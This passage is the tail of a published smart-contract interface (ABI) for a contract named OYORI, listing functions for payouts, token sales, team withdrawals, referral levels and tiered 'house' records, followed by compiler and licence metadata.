"address\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"payouts\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"bool\",\"name\":\"isWorking\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"tokens\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"tokenPrice\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawTime\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"redeposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"buyer\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"selloyo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketing_address\",\"type\":\"address\"}],\"name\":\"set_marketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"teamWithdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"tokensToMatic\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userReferral\",\"outputs\":[{\"internalType\":\"uint256[12]\",\"name\":\"team\",\"type\":\"uint256[12]\"},{\"internalType\":\"uint256[12]\",\"name\":\"referrals\",\"type\":\"uint256[12]\"},{\"internalType\":\"uint256[12]\",\"name\":\"income\",\"type\":\"uint256[12]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userhouse\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalDirect\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalBusiness\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"greenhouse\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"yellowhouse\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"bluehouse\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"greenhouse_status\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"yellowhouse_status\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"bluehouse_status\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"token\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"referral\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamWithdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"teamIncome\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"totalInvestment\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"nonWorkingPayoutCount\",\"type\":\"uint8\"},{\"internalType\":\"uint256\",\"name\":\"lastNonWokingWithdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lastNonWokingWithdrawBase\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"depositCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payoutCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"sellCount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"POI\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OYORI", "CompilerVersion": "v0.8.7+commit.e28d00a7", "OptimizationUsed": "1", "Runs": "2000", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://5162f016ce067aa7cf7a62cd4e879e83cf86182b19825a50b0c0ee57034a52ea"}